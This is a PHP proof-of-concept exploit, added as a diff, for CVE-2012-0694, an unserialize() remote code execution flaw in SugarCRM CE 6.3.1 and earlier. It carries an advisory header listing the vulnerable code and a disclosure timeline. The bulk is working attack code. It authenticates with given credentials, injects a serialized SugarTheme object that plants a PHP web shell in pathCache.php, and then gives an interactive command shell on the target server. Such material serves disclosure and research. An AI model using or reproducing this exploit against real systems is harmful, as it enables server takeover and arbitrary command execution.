@@ -1,0 +1,108 @@
+<?php
+
+/*
+    -------------------------------------------------------
+    SugarCRM CE <= 6.3.1 "unserialize()" PHP Code Execution
+    -------------------------------------------------------
+    
+    author...........: Egidio Romano aka EgiX
+    mail.............: n0b0d13s[at]gmail[dot]com
+    software link....: http://www.sugarcrm.com/
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] Vulnerable code in different locations:
+    
+    include/export_utils.php:377:  $searchForm->populateFromArray(unserialize(base64_decode($query)));
+    include/generic/Save2.php:197:  $current_query_by_page_array = unserialize(base64_decode($current_query_by_page));
+    include/MVC/Controller/SugarController.php:593:  $_REQUEST = unserialize(base64_decode($temp_req['current_query_by_page']));
+    include/MVC/View/views/view.list.php:82:  $current_query_by_page = unserialize(base64_decode($_REQUEST['current_query_by_page']));
+    modules/Import/Importer.php:536:  $firstrow    = unserialize(base64_decode($_REQUEST['firstrow']));
+    modules/ProjectTask/views/view.list.php:95:  $current_query_by_page = unserialize(base64_decode($_REQUEST['current_query_by_page']));
+    
+    The vulnerability  is  caused  due to  all these scripts using "unserialize()" with user  controlled input.
+    This can be exploited to e.g. execute arbitrary PHP code via the  "__destruct()" method of the "SugarTheme"
+    class, passing an  ad-hoc  serialized object through the $_REQUEST['current_query_by_page'] input variable.
+
+    [-] Disclosure timeline:
+    
+    [31/10/2011] - Vulnerability discovered
+    [05/11/2011] - Vendor notified to secure(at)sugarcrm.com
+    [25/11/2011] - Vendor notified to http://www.sugarcrm.com/forums/f22/critical-security-vulnerability-76537/
+    [07/12/2011] - Vendor fix the issue on his own within 6.4.0 RC1 release
+    [10/01/2012] - CVE number requested
+    [12/01/2012] - Assigned CVE-2012-0694
+    [06/02/2012] - Issue addressed within 6.4.0 version
+    [23/06/2012] - Public disclosure
+    
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80))) die("\n[-] No response from {$host}:80\n");
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+------------------------------------------------------------+";
+print "\n| SugarCRM CE <= 6.3.1 Remote Code Execution Exploit by EgiX |";
+print "\n+------------------------------------------------------------+\n";
+
+if ($argc < 5)
+{
+    print "\nUsage......: php $argv[0] <host> <path> <username> <password>\n";
+    print "\nExample....: php $argv[0] localhost / sarah sarah";
+    print "\nExample....: php $argv[0] localhost /sugarcrm/ jim jim\n";
+    die();
+}
+
+list($host, $path) = array($argv[1], $argv[2]);
+
+$payload = "module=Users&action=Authenticate&user_name={$argv[3]}&user_password={$argv[4]}";
+$packet  = "POST {$path}index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: PHPSESSID=1\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+$login = http_send($host, $packet);
+
+if (preg_match("/action=Login/", $login)) die("\n[-] Login failed!\n");
+if (!preg_match("/Set-Cookie: (.*) path/", $login, $sid)) die("\n[-] Session ID not found!\n");
+
+class SugarTheme
+{
+    protected $dirName = '../..';
+    private   $_jsCache = '<?php error_reporting(0);passthru(base64_decode($_SERVER[HTTP_CMD])); ?>';
+}
+
+$payload = "module=Contacts&Contacts2_CONTACT_offset=1&current_query_by_page=".base64_encode(serialize(new SugarTheme));
+$packet  = "POST {$path}index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: {$sid[1]}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+http_send($host, $packet);
+
+$packet  = "GET {$path}pathCache.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+    print "\nsugar-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/s:72:"(.*)";s:8/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
